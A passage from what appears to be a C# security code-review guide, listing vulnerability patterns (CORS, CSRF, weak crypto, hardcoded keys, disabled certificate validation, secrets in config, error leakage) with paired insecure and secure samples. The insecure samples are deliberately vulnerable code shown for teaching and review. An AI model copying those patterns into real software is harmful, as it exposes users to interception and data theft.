// GOOD: All security flags set
Response.Cookies.Append("auth", token, new CookieOptions
{
    HttpOnly = true,
    Secure = true,
    SameSite = SameSiteMode.Strict,
    Expires = DateTimeOffset.UtcNow.AddHours(1),
    IsEssential = false
});

// GOOD: Configure globally in authentication setup
services.AddAuthentication().AddCookie(options =>
{
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
});
```

**Fix**: Always set `HttpOnly = true`, `Secure = true`, and `SameSite = Strict` (or `Lax`) on authentication cookies. Configure these globally in the authentication middleware.

---

#### SEC-AUTH-07: CORS Misconfiguration
**Severity**: High
**OWASP**: A01:2021 Broken Access Control, A05:2021 Security Misconfiguration
**Source**: OWASP, .NET Security Guidelines

**Signal**: CORS policy with `AllowAnyOrigin()` combined with `AllowCredentials()`, or overly permissive origin patterns.

```csharp
// BAD: AllowAnyOrigin with AllowCredentials (browser blocks this, but signals bad design)
services.AddCors(options =>
{
    options.AddPolicy("default", builder =>
    {
        builder.AllowAnyOrigin()
               .AllowAnyHeader()
               .AllowAnyMethod()
               .AllowCredentials();  // Incompatible with AllowAnyOrigin, signals intent to be wide open
    });
});

// BAD: Wildcard origin in production
services.AddCors(options =>
{
    options.AddPolicy("default", builder =>
    {
        builder.AllowAnyOrigin()
               .AllowAnyHeader()
               .AllowAnyMethod();
    });
});

// GOOD: Specific origins
services.AddCors(options =>
{
    options.AddPolicy("default", builder =>
    {
        builder.WithOrigins("https://app.example.com", "https://admin.example.com")
               .WithMethods("GET", "POST")
               .WithHeaders("Content-Type", "Authorization")
               .AllowCredentials();
    });
});
```

**Fix**: Specify exact allowed origins. Only allow necessary HTTP methods and headers. Use `AllowCredentials()` only with specific origins, never with `AllowAnyOrigin()`.

---

#### SEC-AUTH-08: Missing Anti-Forgery Token
**Severity**: Medium
**OWASP**: A01:2021 Broken Access Control
**Source**: OWASP, ASP.NET Core Security Guidelines

**Signal**: POST/PUT/DELETE endpoints in MVC controllers without `[ValidateAntiForgeryToken]` or auto-validation middleware.

```csharp
// BAD: State-changing endpoint without CSRF protection
[HttpPost]
public IActionResult UpdateProfile(ProfileModel model)
{
    _profileService.Update(model);
    return RedirectToAction("Index");
}

// GOOD: Anti-forgery token validated
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult UpdateProfile(ProfileModel model)
{
    _profileService.Update(model);
    return RedirectToAction("Index");
}

// GOOD: Global anti-forgery filter
services.AddControllersWithViews(options =>
{
    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());
});
```

**Fix**: Add `[ValidateAntiForgeryToken]` on all state-changing actions, or use `AutoValidateAntiforgeryTokenAttribute` as a global filter. For APIs using JWT bearer tokens, CSRF protection is typically provided by the token itself.

---

### Cryptography Patterns

#### SEC-CRYPTO-01: Weak Cryptographic Algorithm
**Severity**: High
**OWASP**: A02:2021 Cryptographic Failures
**Source**: Microsoft SDL, NIST guidelines

**Signal**: Usage of `MD5`, `SHA1` for security purposes (integrity verification, password hashing, HMAC), or `DES`/`TripleDES`/`RC4` for encryption.

```csharp
// BAD: MD5 for integrity verification
var hash = MD5.HashData(fileBytes);  // Collision attacks are practical

// BAD: SHA1 for security
var hash = SHA1.HashData(password);  // Collision attacks demonstrated

// BAD: DES encryption
var des = DES.Create();  // 56-bit key -- trivially brute-forced

// BAD: TripleDES
var tdes = TripleDES.Create();  // 64-bit block -- Sweet32 attack

// GOOD: SHA-256 or SHA-512 for hashing
var hash = SHA256.HashData(fileBytes);

// GOOD: AES-256 for encryption
using var aes = Aes.Create();
aes.KeySize = 256;
aes.Mode = CipherMode.CBC;
aes.GenerateIV();

// GOOD: Bcrypt/Argon2 for passwords (via library)
var hashedPassword = BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
```

**Fix**: Replace MD5/SHA1 with SHA-256+. Replace DES/TripleDES/RC4 with AES-256. Use Argon2id or bcrypt for password hashing, never raw SHA-*. Note: MD5/SHA1 are acceptable for non-security checksums (e.g., cache keys).

---

#### SEC-CRYPTO-02: Hardcoded Encryption Key or IV
**Severity**: Critical
**OWASP**: A02:2021 Cryptographic Failures
**Source**: Microsoft SDL, NIST SSDF

**Signal**: Encryption keys or initialization vectors defined as constants, string literals, or byte arrays in source code.

```csharp
// BAD: Hardcoded key
private static readonly byte[] Key = new byte[]
    { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
      0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };

// BAD: Hardcoded IV
private const string IV = "1234567890123456";

// BAD: Key derived from hardcoded string
var key = Encoding.UTF8.GetBytes("MySecretEncryptionKey123");

// GOOD: Key from secure storage
var key = await keyVault.GetSecretAsync("encryption-key");

// GOOD: Random IV per encryption operation
using var aes = Aes.Create();
aes.GenerateKey();   // Or load from Key Vault
aes.GenerateIV();    // Fresh IV for each encryption
// Prepend IV to ciphertext for decryption
```

**Fix**: Store keys in Azure Key Vault, DPAPI, or HSM. Generate a fresh random IV for each encryption operation. Never reuse IVs. Prepend the IV to ciphertext (it need not be secret).

---

#### SEC-CRYPTO-03: ECB Mode for Block Cipher
**Severity**: High
**OWASP**: A02:2021 Cryptographic Failures
**Source**: Microsoft SDL, NIST SP 800-38A

**Signal**: Block cipher (AES, etc.) used with ECB mode, which produces identical ciphertext for identical plaintext blocks.

```csharp
// BAD: ECB mode leaks patterns
using var aes = Aes.Create();
aes.Mode = CipherMode.ECB;  // Identical plaintext blocks produce identical ciphertext

// GOOD: CBC with random IV
using var aes = Aes.Create();
aes.Mode = CipherMode.CBC;
aes.GenerateIV();

// GOOD: AES-GCM for authenticated encryption (.NET Core 3.0+)
using var aesGcm = new AesGcm(key, AesGcm.TagByteSizes.MaxSize);
var nonce = new byte[AesGcm.NonceByteSizes.MaxSize];
RandomNumberGenerator.Fill(nonce);
aesGcm.Encrypt(nonce, plaintext, ciphertext, tag);
```

**Fix**: Use CBC mode with a random IV, or prefer AES-GCM for authenticated encryption (provides both confidentiality and integrity).

---

#### SEC-CRYPTO-04: Insecure Random for Security-Sensitive Values
**Severity**: High
**OWASP**: A02:2021 Cryptographic Failures
**Source**: .NET Security Guidelines

**Signal**: `System.Random` used to generate tokens, keys, nonces, passwords, or any security-sensitive value.

```csharp
// BAD: System.Random for security token (predictable)
var random = new Random();
var token = new byte[32];
random.NextBytes(token);
var resetToken = Convert.ToBase64String(token);

// BAD: Random for session ID
var sessionId = new Random().Next().ToString();

// GOOD: RandomNumberGenerator (cryptographically secure)
var token = new byte[32];
RandomNumberGenerator.Fill(token);
var resetToken = Convert.ToBase64String(token);

// GOOD: For random strings
var tokenString = Convert.ToHexString(RandomNumberGenerator.GetBytes(32));
```

**Fix**: Use `RandomNumberGenerator.Fill()` or `RandomNumberGenerator.GetBytes()` for all security-sensitive random values. `System.Random` is fine for non-security purposes (shuffling UI elements, test data).

---

#### SEC-CRYPTO-05: Disabled Certificate Validation
**Severity**: Critical
**OWASP**: A02:2021 Cryptographic Failures
**Source**: Microsoft SDL

**Signal**: `ServerCertificateCustomValidationCallback` set to always return `true`, or `ServicePointManager.ServerCertificateValidationCallback` disabled.

```csharp
// BAD: Certificate validation disabled -- MITM attack possible
var handler = new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
};
var client = new HttpClient(handler);

// BAD: Global certificate validation disabled
ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) => true;

// GOOD: Use default validation (validates chain and hostname)
var client = new HttpClient();

// GOOD: Custom validation with actual checks
var handler = new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (message, cert, chain, errors) =>
    {
        if (errors == SslPolicyErrors.None) return true;
        // Log the specific error for debugging
        logger.LogWarning("Certificate error: {Errors} for {Host}", errors, message.RequestUri?.Host);
        return false;
    }
};
```

**Fix**: Remove custom certificate callbacks that return `true` unconditionally. If custom validation is needed, implement actual checks. For development, use `#if DEBUG` guards and never deploy to production.

---

#### SEC-CRYPTO-06: Obsolete RNGCryptoServiceProvider
**Severity**: Low
**OWASP**: N/A (correctness, not vulnerability)
**Source**: .NET API documentation

**Signal**: Usage of `RNGCryptoServiceProvider` which is obsolete in .NET 6+ in favor of `RandomNumberGenerator`.

```csharp
// BAD: Obsolete API (still secure, but deprecated)
using var rng = new RNGCryptoServiceProvider();
var bytes = new byte[32];
rng.GetBytes(bytes);

// GOOD: Modern API
var bytes = RandomNumberGenerator.GetBytes(32);

// GOOD: Fill existing buffer
var bytes = new byte[32];
RandomNumberGenerator.Fill(bytes);
```

**Fix**: Replace `RNGCryptoServiceProvider` with static `RandomNumberGenerator` methods. The new API is simpler (no `IDisposable`) and equally secure.

---

### Secrets & Configuration Patterns

#### SEC-CFG-01: Secrets in appsettings.json Committed to Source Control
**Severity**: Critical
**OWASP**: A05:2021 Security Misconfiguration
**Source**: OWASP, .NET Security Guidelines

**Signal**: `appsettings.json` or `appsettings.*.json` containing passwords, API keys, connection strings with credentials, or JWT signing keys and the file is tracked in source control.

```json
// BAD: Secrets in appsettings.json (committed to git)
{
  "ConnectionStrings": {
    "Default": "Server=prod;Database=app;User Id=sa;Password=<REDACTED>"
  },
  "Jwt": {
    "SigningKey": "super-secret-jwt-key-that-should-not-be-here"
  },
  "ExternalApi": {
    "ApiKey": "sk-proj-abc123"
  }
}
```

```csharp
// GOOD: Use user secrets for development
// dotnet user-secrets set "ConnectionStrings:Default" "Server=localhost;..."

// GOOD: Use environment variables
var connectionString = Environment.GetEnvironmentVariable("CONNECTION_STRING");

// GOOD: Use Azure Key Vault
builder.Configuration.AddAzureKeyVault(
    new Uri("https://myvault.vault.azure.net/"),
    new DefaultAzureCredential());

// GOOD: appsettings.json has only non-sensitive configuration
{
  "Logging": { "LogLevel": { "Default": "Information" } },
  "AllowedHosts": "*"
}
```

**Fix**: Remove secrets from `appsettings.json` immediately. Use `dotnet user-secrets` for development, environment variables for CI, Azure Key Vault for production. Add secret-containing files to `.gitignore`. Rotate any secrets that were committed.

---

#### SEC-CFG-02: Connection String with Plain Text Password
**Severity**: High
**OWASP**: A05:2021 Security Misconfiguration, A07:2021 Authentication Failures
**Source**: .NET Security Guidelines

**Signal**: Connection strings containing `Password=`, `Pwd=`, or `User Id=` with inline credentials, regardless of where they are stored.

```csharp
// BAD: Connection string with embedded credentials
"Server=myserver;Database=mydb;User Id=admin;Password=<REDACTED>;"

// GOOD: Windows/Integrated authentication (no password needed)
"Server=myserver;Database=mydb;Integrated Security=true;"

// GOOD: Azure Managed Identity
"Server=myserver.database.windows.net;Database=mydb;Authentication=Active Directory Managed Identity;"

// GOOD: Certificate-based authentication
"Server=myserver;Database=mydb;Encrypt=true;TrustServerCertificate=false;"
// + certificate configured in Key Vault or local store
```

**Fix**: Prefer Integrated Security or Managed Identity. If SQL authentication is required, store connection strings in Key Vault. Never embed passwords in connection strings in code or config files.

---

#### SEC-CFG-03: Missing Production Environment Check
**Severity**: Medium
**OWASP**: A05:2021 Security Misconfiguration
**Source**: ASP.NET Core Security Guidelines

**Signal**: Development-only features (Swagger UI, developer exception page, CORS wildcard) enabled without environment checks.

```csharp
// BAD: Developer exception page without environment check
app.UseDeveloperExceptionPage();  // Shows full stack traces to all users

// BAD: Swagger enabled unconditionally
app.UseSwagger();
app.UseSwaggerUI();

// GOOD: Environment-specific configuration
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
    app.UseSwagger();
    app.UseSwaggerUI();
}
else
{
    app.UseExceptionHandler("/Error");
    app.UseHsts();
}
```

**Fix**: Wrap development features in `IsDevelopment()` checks. Use `UseExceptionHandler` in production. Consider using `UseStatusCodePages` for user-friendly error pages.

---

#### SEC-CFG-04: Stack Trace Exposed in Production
**Severity**: Medium
**OWASP**: A05:2021 Security Misconfiguration
**Source**: OWASP, .NET Security Guidelines

**Signal**: Exception details or stack traces returned in HTTP responses to clients, either through `UseDeveloperExceptionPage()` in production or custom error handling that includes `Exception.ToString()`.

```csharp
// BAD: Stack trace in API response
[HttpGet("{id}")]
public IActionResult GetItem(int id)
{
    try
    {
        return Ok(_service.GetItem(id));
    }
    catch (Exception ex)
    {
        return StatusCode(500, new { error = ex.ToString() });  // Leaks internals
    }
}

// BAD: Exception message exposed
catch (Exception ex)
{
    return BadRequest(ex.Message);  // May contain SQL, file paths, etc.
}

// GOOD: Generic error response
catch (Exception ex)
{
    _logger.LogError(ex, "Error retrieving item {ItemId}", id);
    return StatusCode(500, new { error = "An internal error occurred." });
}

// GOOD: ProblemDetails with safe information
catch (Exception ex)
{
    _logger.LogError(ex, "Error retrieving item {ItemId}", id);
    return Problem(
        title: "Internal Server Error",
        statusCode: 500,
        detail: "The request could not be processed. Please try again.");
}
```

**Fix**: Never return `Exception.ToString()` or `Exception.Message` to clients in production. Log the full exception server-side. Return generic error messages or RFC 7807 `ProblemDetails`.

---

#### SEC-CFG-05: Verbose Error Messages Leaking Implementation Details
**Severity**: Medium
**OWASP**: A05:2021 Security Misconfiguration
**Source**: OWASP, .NET Security Guidelines

**Signal**: Error messages that reveal database schema, file paths, technology stack, or internal service names to external clients.

```csharp
// BAD: Error reveals database schema
catch (SqlException ex)
{
    return BadRequest($"Query failed on table dbo.UserCredentials: {ex.Message}");
}

// BAD: Error reveals file paths
catch (IOException ex)
{
    return StatusCode(500, $"Failed to read {ex.FileName}");
    // Reveals: "Failed to read C:\app\secrets\config.xml"
}

// BAD: Error reveals internal service topology
catch (HttpRequestException ex)
{
    return StatusCode(502, $"Backend service at {_backendUrl} is unavailable");
    // Reveals: "Backend service at http://internal-api.corp.net:8080 is unavailable"
}

// GOOD: Opaque error with correlation ID
catch (Exception ex)
{
    var correlationId = Activity.Current?.Id ?? Guid.NewGuid().ToString();
    _logger.LogError(ex, "Operation failed. CorrelationId: {CorrelationId}", correlationId);
    return StatusCode(500, new
    {
        error = "An error occurred processing your request.",
        correlationId
    });
}
```

**Fix**: Return opaque error messages to clients with a correlation ID. Log detailed errors server-side. Use `ProblemDetails` middleware for consistent error formatting.

---

## Scope Boundaries

This skill focuses on **security vulnerabilities that can be exploited** -- problems that allow unauthorized access, data theft, code execution, or denial of service. It does NOT flag:

- **Code style or formatting** unless the style issue directly masks a security bug
- **Performance issues** unless they create a denial-of-service vector (e.g., ReDoS)
- **Missing logging** unless the absence hides security-relevant events
- **Test code security** unless the test ships in production (test credentials, etc.)
- **Dependency vulnerabilities** (use `dotnet list package --vulnerable` for that)

**When in doubt**: Could an attacker exploit this to gain unauthorized access, execute code, steal data, or deny service? If yes, it is a finding. If no, it belongs in a different review skill.

## Related Skills

- [C# Error Handling Review](../cs-error-handling/SKILL.md) -- Error handling patterns that may mask or expose security issues
- [C# Performance Review](../cs-performance/SKILL.md) -- Performance patterns that may create DoS vectors
- [C# API Design Review](../cs-api-design/SKILL.md) -- API design patterns affecting security surface area

## References

1. OWASP Top 10 (2021) -- https://owasp.org/Top10/
2. .NET Security Guidelines -- https://learn.microsoft.com/en-us/dotnet/standard/security/
3. Microsoft SDL Practices -- https://www.microsoft.com/en-us/securityengineering/sdl/practices
4. NIST SSDF -- https://csrc.nist.gov/publications/detail/sp/800-218/final
5. BinaryFormatter security risks -- https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide
6. JSON.NET TypeNameHandling risks -- https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html
7. OWASP .NET Security Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html
8. ASP.NET Core Security Documentation -- https://learn.microsoft.com/en-us/aspnet/core/security/
9. CWE/SANS Top 25 -- https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html
